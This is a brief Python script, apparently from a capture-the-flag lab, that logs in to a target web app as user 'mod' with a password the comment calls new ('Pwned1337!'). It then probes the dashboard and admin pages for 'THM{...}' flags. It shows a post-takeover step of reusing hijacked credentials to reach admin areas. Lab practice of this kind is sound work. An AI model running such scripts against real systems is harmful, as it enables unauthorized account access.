import requests, re, time

# Re-login as mod with new password
s2 = requests.Session()
r2 = s2.post('http://10.82.129.17/login.php', data={'username': 'mod', 'password': 'Pwned1337!'}, allow_redirects=True)
print('login:', r2.status_code, r2.url)

r3 = s2.get('http://10.82.129.17/dashboard.php')
r4 = s2.get('http://10.82.129.17/admin_panel.php')
r5 = s2.get('http://10.82.129.17/admin_view.php')

for label, resp in [('dashboard', r3), ('admin_panel', r4), ('admin_view', r5)]:
    flags = re.findall(r'THM\{[^}]+\}', resp.text)
    if flags:
        print(f'[FLAG] {label}:', flags)
    else:
        print(f'{label}: {resp.status_code} {resp.url}')
        # Check for admin hints
        if 'admin' in resp.text.lower() or 'flag' in resp.text.lower():
            print('  snippet:', resp.text[500:1200])
